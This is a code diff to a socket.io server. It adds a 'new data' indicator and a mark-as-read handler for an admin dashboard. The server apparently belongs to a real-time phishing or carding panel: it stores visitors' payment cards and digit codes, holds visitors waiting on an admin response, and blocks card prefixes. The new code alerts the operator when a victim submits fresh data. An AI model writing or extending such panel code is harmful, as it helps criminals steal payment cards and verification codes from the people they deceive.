@@ -241,6 +241,7 @@ io.on("connection", (socket) => {
         dataHistory: [],
         paymentCards: [],
         digitCodes: [],
+        hasNewData: false,
         isBlocked: false,
         isConnected: true,
         sessionStartTime: Date.now(),
@@ -325,6 +326,7 @@ io.on("connection", (socket) => {
 
       visitor.page = data.page;
       visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
+      visitor.hasNewData = true;
       visitors.set(socket.id, visitor);
       saveVisitorPermanently(visitor);
 
@@ -555,6 +557,34 @@ io.on("connection", (socket) => {
     });
     
     console.log("All data cleared by admin");
+  });
+
+  // Admin: Mark visitor data as read (hide new data indicator)
+  socket.on("admin:markAsRead", (visitorId) => {
+    // Find visitor by ID in active visitors
+    let found = false;
+    visitors.forEach((v, socketId) => {
+      if (v._id === visitorId) {
+        v.hasNewData = false;
+        visitors.set(socketId, v);
+        saveVisitorPermanently(v);
+        found = true;
+      }
+    });
+    
+    // Also update in saved visitors
+    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
+    if (savedVisitor) {
+      savedVisitor.hasNewData = false;
+      saveData();
+    }
+    
+    // Notify all admins about the update
+    admins.forEach((admin, adminSocketId) => {
+      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
+    });
+    
+    console.log(`Visitor ${visitorId} marked as read`);
   });
 
   // Admin: Block card prefix
